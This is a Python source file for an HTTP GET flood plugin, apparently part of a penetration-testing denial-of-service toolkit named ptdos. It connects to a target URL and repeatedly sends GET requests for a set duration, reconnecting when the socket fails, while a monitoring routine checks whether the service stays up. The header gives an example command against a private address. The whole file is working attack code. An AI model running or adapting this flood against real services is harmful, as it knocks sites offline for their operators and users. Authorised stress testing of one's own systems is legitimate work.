"""ptdos extension that adds a HTTP GET Flood attack."""
# python3 ptdos.py -a httpgetflood -d 5 -dst "http://192.168.0.80/test/test" -st 0.001

# own libs
from infrastructure import factory
from monitoring.ptcheckservice import attack_append_out_data, attack_checkservice_review, print_error
from misc.pt_http import create_request
from misc.pt_socket import create_socket
# external libs
from dataclasses import dataclass
from time import time, asctime, sleep
from ptlibs.ptmisclib import out_if, out_ifnot, ptprint
from misc.globalfuncs import parse_url
from socket import error


@dataclass
class HttpGetFlood:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""
        sleeptime = args['sleeptime']
        url = parse_url(dst)

        # Create http GET request
        request = create_request("GET", url.hostname, url.query, url.path)

        # create socket
        sock = create_socket(self.name)
        sock.connect((url.hostname, url.port or 80))

        # checkservice start monitoring
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)

        try:
            while True:  # while loop to stop the attack after time specified in duration runs out
                if time() - att_start_t_epoch >= duration:
                    monitoringprocess()  # stop checkservice end monitoring
                    sock.close()  # close socket
                    att_end_t_asc = asctime()  # save attack's ending time
                    sleep(1)  # wait for 1 second to stop the monitoring process
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break

                # do the HTTP GET flood attack
                try:
                    sock.send(request)
                    sleep(sleeptime)
                except error as serr:
                    ptprint(out_ifnot(f"Close socket due to {serr}.", "ERROR", use_json))
                    sock.close()  # close socket
                    sleep(0.25)  # wait for closing socket
                    ptprint(out_ifnot("Create and connect new socket.", "INFO", use_json))
                    sock = create_socket(self.name)
                    sock.connect((url.hostname, url.port or 80))
                    ptprint(out_ifnot(f"Continue {self.name} attack with new socket.", "INFO", use_json))

            # append attack outcome data to JSON object or print info to console
            attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, url.hostname)

            # append checkservice outcome data to JSON object or print info to console
            monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

            # print JSON object to console if self.use_json == TRUE
            ptprint(out_if(json_obj.get_all_json(), "", use_json))

            return

        except BaseException as err:
            sock.close()  # stop attack
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0])

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"HTTP GET Flood attack options": [
                ["-a", "--attack", "<attack>", "Attack name - httpgetflood"],
                ["-d", "--duration", "<duration>", "Attack duration in seconds. Default 10 seconds."],
                ["-dst", "--destination", "<dst>", 'Specify destination URL like "http://domain.com/test/pth?par=val".'],
                ["-st", "--sleep-time", "<sleeptime>", "Time in seconds between HTTP packets. Default 0 seconds."]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""


def register() -> None:
    """Register attack in factory."""
    factory.register("httpgetflood", HttpGetFlood)
